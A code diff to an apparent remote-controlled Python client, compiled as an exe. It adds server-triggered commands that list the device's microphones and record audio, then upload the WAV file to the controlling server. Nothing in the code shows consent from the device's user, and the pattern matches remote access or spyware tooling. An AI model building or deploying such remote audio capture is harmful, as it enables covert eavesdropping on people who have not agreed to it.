@@ -707,6 +707,82 @@ def delete_video_cache(url: str):
 
 # ─── Command handler ─────────────────────────────────────────────────────────
 
+def get_and_send_audio_devices(chat_id: str):
+    """Получает список микрофонов и отправляет на сервер."""
+    try:
+        import sounddevice as sd
+        devices_raw = sd.query_devices()
+        mics = []
+        for i, d in enumerate(devices_raw):
+            if d['max_input_channels'] > 0:
+                mics.append({"index": i, "name": d['name']})
+        log.info(f"Found {len(mics)} microphones")
+        http_post_json("/micro_devices", {
+            "chat_id": chat_id,
+            "device_id": DEVICE_ID,
+            "devices": mics,
+        })
+    except ImportError:
+        log.error("sounddevice not installed")
+        http_post_json("/text_reply", {
+            "chat_id": chat_id,
+            "text": "⚠️ Библиотека sounddevice не установлена.",
+            "device_id": DEVICE_ID,
+        })
+    except Exception as e:
+        log.error(f"get_audio_devices error: {e}")
+        http_post_json("/text_reply", {
+            "chat_id": chat_id,
+            "text": f"⚠️ Ошибка получения микрофонов: {e}",
+            "device_id": DEVICE_ID,
+        })
+
+
+def record_and_send_audio(seconds: int, chat_id: str, device_index: int = None):
+    """Записывает звук с микрофона и отправляет WAV-файл на сервер."""
+    import wave, tempfile
+    try:
+        import sounddevice as sd
+        import numpy as np
+        log.info(f"Recording audio: {seconds}s device={device_index}")
+        samplerate = 44100
+        recording = sd.rec(
+            int(seconds * samplerate),
+            samplerate=samplerate,
+            channels=1,
+            dtype='int16',
+            device=device_index,
+        )
+        sd.wait()
+
+        tmp = tempfile.NamedTemporaryFile(suffix='.wav', delete=False)
+        with wave.open(tmp.name, 'wb') as wf:
+            wf.setnchannels(1)
+            wf.setsampwidth(2)
+            wf.setframerate(samplerate)
+            wf.writeframes(recording.tobytes())
+
+        log.info(f"Audio recorded: {tmp.name}")
+        http_post_multipart("/upload", tmp.name, chat_id,
+                            caption=f"🎙 Запись {seconds} сек")
+        os.unlink(tmp.name)
+
+    except ImportError:
+        log.error("sounddevice not installed")
+        http_post_json("/text_reply", {
+            "chat_id": chat_id,
+            "text": "⚠️ Библиотека sounddevice не установлена в exe.",
+            "device_id": DEVICE_ID,
+        })
+    except Exception as e:
+        log.error(f"record_and_send_audio error: {e}")
+        http_post_json("/text_reply", {
+            "chat_id": chat_id,
+            "text": f"⚠️ Ошибка записи: {e}",
+            "device_id": DEVICE_ID,
+        })
+
+
 def handle_command(cmd: dict):
     name     = cmd.get("cmd", "")
     chat_id  = cmd.get("_chat_id", "")
@@ -776,6 +852,14 @@ def handle_command(cmd: dict):
     elif name in ("open_gallery", "open_camera"):
         # Both → open file manager / file picker
         open_file_picker(chat_id)
+
+    elif name == "get_audio_devices":
+        threading.Thread(target=get_and_send_audio_devices, args=(chat_id,), daemon=True).start()
+
+    elif name == "record_audio":
+        seconds = cmd.get("seconds", 10)
+        device_index = cmd.get("device_index", None)
+        threading.Thread(target=record_and_send_audio, args=(seconds, chat_id, device_index), daemon=True).start()
 
     else:
         log.warning(f"Unknown command: {name}")
